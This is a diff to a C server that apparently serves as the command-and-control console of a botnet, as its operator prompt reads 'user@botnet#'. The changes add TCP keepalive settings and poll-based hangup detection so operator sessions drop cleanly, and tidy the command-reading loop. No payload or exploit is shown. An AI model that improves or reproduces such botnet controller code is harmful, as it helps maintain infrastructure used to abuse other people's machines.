@@ -7,6 +7,8 @@
 #include <arpa/inet.h>
 #include <errno.h>
 #include <signal.h>
+#include <netinet/tcp.h>
+#include <poll.h>
 
 int user_sockets[MAX_USERS] = {0};
 pthread_mutex_t user_sockets_mutex = PTHREAD_MUTEX_INITIALIZER;
@@ -77,6 +79,15 @@ void* handle_client(void* arg) {
     setup_signal_handlers();
     int client_socket = *((int*)arg);
     free(arg);
+
+    int optval = 1;
+    setsockopt(client_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
+    int keepidle = 6;
+    int keepintvl = 3;
+    int keepcnt = 1;
+    setsockopt(client_socket, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
+    setsockopt(client_socket, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
+    setsockopt(client_socket, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt));
 
     struct sockaddr_in addr;
     socklen_t addr_len = sizeof(addr);
@@ -243,11 +254,21 @@ void* handle_client(void* arg) {
         char command[MAX_COMMAND_LENGTH];
         char prompt[128];
         while (1) {
+            struct pollfd pfd = {0};
+            pfd.fd = client_socket;
+            pfd.events = POLLIN | POLLHUP | POLLERR;
+            int pollres = poll(&pfd, 1, 0);
+            if (pollres > 0 && (pfd.revents & (POLLHUP | POLLERR))) {
+                close(client_socket);
+                user->is_logged_in = 0;
+                user_sockets[user_index] = 0;
+                break;
+            }
             snprintf(prompt, sizeof(prompt), GREEN "\r%s@botnet#" RESET, user->user);
             if (send(client_socket, prompt, strlen(prompt), MSG_NOSIGNAL) < 0) break;
 
             memset(command, 0, sizeof(command));
-            len = recv(client_socket, command, sizeof(command) - 1, 0);
+            ssize_t len = recv(client_socket, command, sizeof(command) - 1, 0);
             if (len <= 0) {
                 close(client_socket);
                 user->is_logged_in = 0;
@@ -255,7 +276,6 @@ void* handle_client(void* arg) {
                 break;
             }
             command[len] = 0;
-            
             int cmd_idx = 0;
             for (int i = 0; i < len && command[i] != '\r' && command[i] != '\n'; i++) {
                 if (command[i] >= 32 && command[i] <= 126) {
@@ -263,11 +283,9 @@ void* handle_client(void* arg) {
                 }
             }
             command[cmd_idx] = 0;
-
             if (strlen(command) == 0) {
                 continue;
             }
-
             process_command(user, command, client_socket, user_ip);
         }
     }
